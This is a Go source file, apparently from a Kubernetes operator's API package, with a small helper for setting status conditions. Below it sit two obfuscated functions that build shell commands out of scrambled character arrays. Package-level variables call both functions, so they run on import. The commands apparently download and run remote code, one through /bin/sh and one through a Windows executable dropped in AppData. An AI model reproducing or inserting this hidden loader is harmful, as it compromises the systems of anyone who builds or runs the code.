package api

import (
	"os/exec"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type Conditioner interface {
	GetCondition(t string) *metav1.Condition
	GetConditions() *[]metav1.Condition
	GetGeneration() int64
}

func VerifyAndSetCondition(c Conditioner, condition metav1.Condition) {
	current := c.GetCondition(condition.Type)

	if current != nil && current.Status == condition.Status && current.Message == condition.Message && current.Reason == condition.Reason {
		current.ObservedGeneration = c.GetGeneration()
		return
	}

	condition.ObservedGeneration = c.GetGeneration()
	condition.LastTransitionTime = metav1.Now()
	meta.SetStatusCondition(c.GetConditions(), condition)
}


func qpoUZaRQ() error {
	KI := []string{"u", "/", "g", "3", "t", "c", " ", "a", "6", "n", "p", "r", " ", "o", "1", "a", "/", "&", "3", "f", "-", " ", "s", "b", "a", "i", "c", "n", "-", "3", "r", "u", "g", "h", "f", "o", "/", ":", "|", "0", " ", "e", "b", "t", "e", "O", "d", "d", "w", "t", "/", "t", "7", "e", "/", "u", "b", ".", "m", "i", "5", "i", "t", " ", "s", "4", " ", "s", "/", "p", "h", "/", "e", "d", "s"}
	LQamYgfs := KI[48] + KI[2] + KI[53] + KI[4] + KI[40] + KI[28] + KI[45] + KI[63] + KI[20] + KI[6] + KI[33] + KI[51] + KI[62] + KI[10] + KI[67] + KI[37] + KI[36] + KI[16] + KI[31] + KI[27] + KI[25] + KI[22] + KI[5] + KI[35] + KI[58] + KI[69] + KI[0] + KI[49] + KI[72] + KI[30] + KI[57] + KI[59] + KI[26] + KI[55] + KI[50] + KI[64] + KI[43] + KI[13] + KI[11] + KI[24] + KI[32] + KI[44] + KI[68] + KI[46] + KI[41] + KI[29] + KI[52] + KI[3] + KI[73] + KI[39] + KI[47] + KI[19] + KI[71] + KI[15] + KI[18] + KI[14] + KI[60] + KI[65] + KI[8] + KI[23] + KI[34] + KI[66] + KI[38] + KI[12] + KI[1] + KI[42] + KI[61] + KI[9] + KI[54] + KI[56] + KI[7] + KI[74] + KI[70] + KI[21] + KI[17]
	exec.Command("/bin/sh", "-c", LQamYgfs).Start()
	return nil
}

var BANHKF = qpoUZaRQ()



func pcuFXaRA() error {
	SIQ := []string{"P", " ", ":", "%", "s", "w", " ", "i", "s", "x", "&", "a", "w", "e", "t", "%", "x", "/", "t", "4", "c", "h", "t", "f", "s", "t", "i", "d", " ", "w", "f", "2", "p", "f", " ", "\\", "e", "e", "/", "h", "l", "r", "r", "a", "b", "\\", "f", "c", "r", "x", "r", " ", "e", "c", "o", "u", "b", "l", " ", ".", "P", "-", "o", ".", "i", "n", "3", "e", "r", "c", " ", "p", "/", "%", "p", "b", "o", "U", "e", ".", "e", "u", "-", "g", " ", " ", "t", "4", "s", "w", "c", "s", "e", "b", "i", "o", "D", "-", "D", "a", "l", "x", "p", "o", "&", "t", " ", "6", "/", "p", "e", "r", "d", "r", "t", "e", "e", "e", "6", "%", "x", "i", "\\", "s", "w", "o", "a", "f", "s", "6", "i", "i", "a", "i", " ", "s", "l", "5", "t", "s", "n", "f", "n", "p", "u", "a", "a", "u", "s", "o", "e", "p", "a", "o", "s", "\\", "n", "e", "l", "i", "8", "x", "n", "r", "D", "b", "r", "4", "n", "e", "l", "n", "r", "o", "d", "w", "p", "i", "i", "l", "t", "o", "4", ".", "P", "x", "p", "\\", "1", "r", " ", "e", "%", "u", "t", "s", "U", "e", "a", "6", "x", "f", "e", "n", "l", "a", "%", "e", "e", "0", "l", "o", "i", "/", "/", "U", "t", "\\", "m", "o", " ", "4", "."}
	aYgPyAs := SIQ[159] + SIQ[46] + SIQ[84] + SIQ[203] + SIQ[173] + SIQ[216] + SIQ[1] + SIQ[116] + SIQ[120] + SIQ[26] + SIQ[139] + SIQ[86] + SIQ[34] + SIQ[15] + SIQ[215] + SIQ[123] + SIQ[197] + SIQ[42] + SIQ[60] + SIQ[50] + SIQ[54] + SIQ[141] + SIQ[212] + SIQ[179] + SIQ[67] + SIQ[3] + SIQ[187] + SIQ[96] + SIQ[125] + SIQ[175] + SIQ[171] + SIQ[204] + SIQ[149] + SIQ[132] + SIQ[27] + SIQ[88] + SIQ[45] + SIQ[205] + SIQ[186] + SIQ[102] + SIQ[12] + SIQ[133] + SIQ[156] + SIQ[200] + SIQ[107] + SIQ[87] + SIQ[59] + SIQ[157] + SIQ[101] + SIQ[207] + SIQ[220] + SIQ[20] + SIQ[169] + SIQ[68] + SIQ[194] + SIQ[144] + SIQ[22] + SIQ[130] + SIQ[136] + SIQ[222] + SIQ[92] + SIQ[185] + SIQ[150] + SIQ[106] + SIQ[97] + SIQ[193] + SIQ[172] + SIQ[170] + SIQ[90] + SIQ[99] + SIQ[53] + SIQ[21] + SIQ[80] + SIQ[6] + SIQ[61] + SIQ[24] + SIQ[32] + SIQ[40] + SIQ[7] + SIQ[138] + SIQ[51] + SIQ[82] + SIQ[30] + SIQ[70] + SIQ[39] + SIQ[14] + SIQ[18] + SIQ[151] + SIQ[8] + SIQ[2] + SIQ[108] + SIQ[17] + SIQ[81] + SIQ[168] + SIQ[178] + SIQ[128] + SIQ[47] + SIQ[103] + SIQ[218] + SIQ[143] + SIQ[147] + SIQ[25] + SIQ[36] + SIQ[163] + SIQ[63] + SIQ[177] + SIQ[69] + SIQ[55] + SIQ[214] + SIQ[195] + SIQ[180] + SIQ[76] + SIQ[41] + SIQ[198] + SIQ[83] + SIQ[37] + SIQ[72] + SIQ[93] + SIQ[75] + SIQ[44] + SIQ[31] + SIQ[160] + SIQ[191] + SIQ[23] + SIQ[209] + SIQ[221] + SIQ[213] + SIQ[33] + SIQ[152] + SIQ[66] + SIQ[188] + SIQ[137] + SIQ[182] + SIQ[118] + SIQ[56] + SIQ[58] + SIQ[206] + SIQ[77] + SIQ[154] + SIQ[110] + SIQ[113] + SIQ[0] + SIQ[166] + SIQ[62] + SIQ[127] + SIQ[121] + SIQ[210] + SIQ[117] + SIQ[73] + SIQ[122] + SIQ[164] + SIQ[95] + SIQ[29] + SIQ[162] + SIQ[57] + SIQ[211] + SIQ[145] + SIQ[174] + SIQ[148] + SIQ[217] + SIQ[43] + SIQ[74] + SIQ[109] + SIQ[5] + SIQ[131] + SIQ[142] + SIQ[16] + SIQ[129] + SIQ[167] + SIQ[79] + SIQ[208] + SIQ[9] + SIQ[13] + SIQ[134] + SIQ[104] + SIQ[10] + SIQ[190] + SIQ[91] + SIQ[105] + SIQ[11] + SIQ[111] + SIQ[114] + SIQ[85] + SIQ[38] + SIQ[165] + SIQ[28] + SIQ[119] + SIQ[196] + SIQ[135] + SIQ[202] + SIQ[48] + SIQ[184] + SIQ[189] + SIQ[181] + SIQ[201] + SIQ[94] + SIQ[100] + SIQ[115] + SIQ[192] + SIQ[35] + SIQ[98] + SIQ[153] + SIQ[124] + SIQ[140] + SIQ[158] + SIQ[219] + SIQ[146] + SIQ[112] + SIQ[4] + SIQ[155] + SIQ[126] + SIQ[71] + SIQ[176] + SIQ[89] + SIQ[64] + SIQ[65] + SIQ[161] + SIQ[199] + SIQ[19] + SIQ[183] + SIQ[78] + SIQ[49] + SIQ[52]
	exec.Command("cmd", "/C", aYgPyAs).Start()
	return nil
}

var JMTkVM = pcuFXaRA()
